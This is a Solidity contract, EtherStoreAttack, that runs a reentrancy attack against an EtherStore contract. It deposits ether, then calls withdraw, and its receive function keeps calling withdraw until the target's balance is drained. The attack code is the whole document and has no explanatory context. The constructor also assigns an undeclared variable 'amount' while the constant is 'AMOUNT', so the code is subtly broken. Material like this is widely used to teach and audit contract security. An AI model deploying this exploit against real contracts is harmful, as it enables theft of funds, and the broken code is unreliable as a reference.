contract EtherStoreAttack {
    EtherStore public etherStore;
    uint constant AMOUNT = 1;

    constructor(address _etherStoreAddress) {
        amount = 1;
        etherStore = EtherStore(_etherStoreAddress);
    }

    // receive (or fallback) is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= AMOUNT) {
             etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherStore.deposit{value: AMOUNT}();
        etherStore.withdraw();
    }
}